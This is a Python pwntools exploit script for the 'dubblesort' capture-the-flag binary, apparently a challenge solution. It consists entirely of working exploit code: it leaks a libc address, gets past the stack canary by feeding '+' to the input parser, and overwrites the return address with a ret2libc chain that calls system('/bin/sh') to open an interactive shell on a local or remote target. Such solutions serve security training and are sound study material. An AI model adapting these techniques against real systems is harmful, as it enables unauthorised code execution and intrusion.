#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('dubblesort_patched')
libc = exe.libc
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
brva 0xAF9
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    io.sendline(b"A"*(4*7))
    io.recvuntil(b"A"*(4*7))
    leak = u32(io.recv(4))
    libc.address = leak - 0x1b0000 - 0xa
    log.info(f"libc base: %#x", libc.address)

    io.sendlineafter(b":", b"35")

    for _ in range(24):
        io.sendlineafter(b":", b"0")
    
    io.sendlineafter(b":", b"+")

    rop = ROP(libc)
    ret = rop.find_gadget(["ret"])[0]
    system = libc.sym["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))

    padding = [system] * 9 
    chunks = padding + [binsh]

    for i in chunks:
        io.sendlineafter(b":", str(i).encode())
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

